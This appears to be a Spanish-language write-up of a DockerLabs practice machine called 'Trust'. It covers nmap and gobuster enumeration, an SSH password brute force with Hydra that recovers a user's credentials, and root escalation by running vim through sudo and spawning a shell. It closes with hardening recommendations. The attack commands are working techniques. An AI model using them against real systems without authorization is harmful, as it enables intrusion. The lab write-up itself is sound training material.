---
Maquina: Trust
Dificultad: "1"
Descripción: Laboratorio para practicar enumeración web, fuerza bruta SSH con Hydra y escalada de privilegios abusando de sudoers.
Link: https://dockerlabs.es/
"Pentester:": Archundia
---

# Reconocimiento y enumeración 

1. Escaneamos la red con **nmap**
``` bash
sudo namap -PA -O -sV 172.17.0.2 -oN escaneo_trust
```

**Donde:**
sudo: necesario para producir raw packets 
-PA: envía paquetes con TCP con bandera ACK
-O: Detecta que Sistema operativo existe 
-sV: detecta la versión del software o servicio que se esta ejecutando
-oN: guarda el resultado del escaneo

**Resultado**
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
80/tcp open  http    PHP cli server 5.5 or later

```

Al explorar por medio del navegador encontramos que existe un servidor web apache 

![[Pasted image 20260924123934.png|406]]

2. Sabiendo esto busco encontrar directorios ocultos aplicando Fuzzing y usando la herramienta gobuster

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x html,txt,php --exclude-length 10701 -o fuzzing

```
**Donde:**
dir: indicamos modo de ejecución de directorios y archivos web 
-u: indica la dirección web 
-w: indica la ruta de la wordlist 
-x: probara con cada palabra que intente las diferentes extensiones que se indiquen(html, txt, php)
--exclude-length: regla de filtrado
-o: guarda el resultado en un archivo


**Resultados**
```bash
secret.php           (Status: 200) [Size: 927]
```

encontramos una pagina web que nos da como pista un posible nombre de usuario que podemos usar para conectarnos por ssh

![[Pasted image 20260924124807.png|396]]

# Explotación 

3. Hacemos BruteForce al servicio ssh del objetivo, sabiendo que el usuario puede ser Mario o mario por lo que creo un pequeño diccionario

```bash
hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt.gz 172.17.0.2 ssh -t 4   -o bruteForce
```

**Donde:**
-L: indica una wordlist de usuarios
-P: indica una wordlist de contraseñas
ssh: Indicamos que el ataque será contra un servicio ssh 
-t: limitamos el numero de intentos/conexiones simultaneas

> [!NOTE] Consejo
> limitar el numero de conexiones asíncronas se hace para no saturar al demonio sshd  

-o: guarda el resultado en un archivo

**Resultado**
```Bash
# Hydra v9.7 run at 2026-09-19 00:46:11 on 172.17.0.2 ssh (hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt.gz -t 4 -o bruteForce 172.17.0.2 ssh)
[22][ssh] host: 172.17.0.2   login: mario   password: chocolate
```

4. Al obtener la contraseña podemos conectarnos 
```bash
ssh mario@172.17.0.2
```

4. tenemos acceso por lo que procedemos a hacer un reconocimiento de rutina

![[Pasted image 20260924134742.png|685]]

encontramos que podemos ejecutar vim como sudo
# Escalada de privilegios 

Buscando encontramos una vulnerabilidad para escalar privilegios en [GTFOBins](https://web.archive.org/web/20260101045056/https://gtfobins.github.io/gtfobins/vim/#sudo ) por lo que ejecutamos vim como sudo

```bash
sudo /usr/bin/vim
```

* Damos Shift + !
* Ejecutamos:
```Bash
!/bin/bash
```

![[Pasted image 20260924161555.png|302]]

Es así que logramos escalar a un usuario root 

![[Pasted image 20260924161622.png]]


# Soluciones
Como conclusión se hacen las siguientes recomendaciones  

## hardening de contraseñas
Conforme a los requisitos técnicos para la autenticación del marco del NITS SP 800-63B se recomienda: 
- Uso de Longitud sobre Cumplimiento de Complejidad
- Verificación con wordlist publicas
- Bloqueo por intentos fallidos
- Autenticación MFA/2FA
## Control de tasa de intentos
Endurecer las políticas de Rate Limiting, pues el puerto 22 permitió varios intentos seguidos de inicio de sesión sin bloquear dicha actividad maliciosa, por lo que se recomiendan servicios como **Fail2ban** o **CrowdSec** para monitorear los registros de autenticación y bloquearlo aplicando reglas de iptables/nftables a direcciones que superen el numero de intentos permitidos 

## Control de privilegios
Se recomienda eliminar la regla `(ALL) /usr/bin/vim` del archivo `/etc/sudoers` pues el usuario "mario" era capas de ejecutar vim como usuario root.

